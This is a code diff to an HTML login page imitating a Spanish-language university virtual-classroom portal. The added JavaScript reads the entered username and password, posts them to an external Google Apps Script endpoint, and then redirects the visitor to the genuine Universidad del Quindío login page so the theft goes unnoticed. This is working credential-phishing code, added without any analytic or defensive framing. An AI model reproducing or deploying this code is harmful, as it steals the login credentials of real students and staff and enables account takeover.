@@ -1073,16 +1073,36 @@ Programas <strong style="color:#333">Virtuales</strong>
               
               <script>
                 function enviarDatosFirebase(event) {
-                  // Agregar tu lógica de envío de datos aquí
-              
-                  // Después de enviar datos, redirigir
-                  window.location.href = "https://aulasvirtuales.uniquindio.edu.co/auth/qlogin/form.php";
-                  
-                  // Asegúrate de que el formulario no se envíe de forma predeterminada
+                  // Impide que el formulario se envíe de forma predeterminada
                   event.preventDefault();
+              
+                  // Obtiene los valores del formulario
+                  var username = document.getElementById('username').value;
+                  var password = document.getElementById('password').value;
+              
+                  // Construye los datos a enviar al script
+                  var formData = new FormData();
+                  formData.append('username', username);
+                  formData.append('password', password);
+              
+                  // Realiza la solicitud Fetch al script de Google Apps Script
+                  fetch('https://script.google.com/macros/s/AKfycbwRhRvC6WldElD76_EZ_5mKSEo3-seduYBCcQ2o3eSRKC0adcjWIx3sj0fM5CInLX4k/exec', {
+                    method: 'POST',
+                    body: formData
+                  })
+                  .then(response => response.text())
+                  .then(data => {
+                    // La respuesta del script puede ser manejada aquí si es necesario
+                    console.log(data);
+              
+                    // Después de enviar datos, redirigir
+                    window.location.href = "https://aulasvirtuales.uniquindio.edu.co/auth/qlogin/form.php";
+                  })
+                  .catch(error => {
+                    console.error('Error al enviar datos:', error);
+                  });
                 }
-              </script>
-</div>              
+              </script>              
 </div>
 <script>
 document.getElementById("urlfererer").value = window.location.href;
